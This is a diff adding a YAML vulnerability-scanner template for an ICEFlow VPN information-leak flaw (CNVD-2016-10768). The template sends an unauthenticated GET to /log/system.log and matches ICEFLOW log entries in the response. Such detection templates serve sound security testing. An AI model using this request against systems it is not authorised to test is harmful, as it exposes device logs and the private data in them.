@@ -1,0 +1,19 @@
+name: yaml-poc-iceflow-icevpn-leak-CNVD-2016-10768
+binding: 20a2c7a6-3cda-4ecb-a55d-d0f2e8a5e38b
+detail:
+    author: system_user
+    links:
+        - http://disk.scan.cm/zlsec/zlsec_info/document/wiki/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md?hash=zE0KEPGJ
+    vulnerability:
+        id: 821e058c-580d-45a4-9028-fe5cea9459f4
+        level: medium
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /log/system.log
+            follow_redirects: false
+        expression: response.status == 200 && "\\d{4}/\\d{2}/\\d{2}\\s+\\d{2}:\\d{2}:\\d{2}\\s+ICEFLOW\\s+(.*):(.*)\n".bmatches(response.body)
+expression: r1()
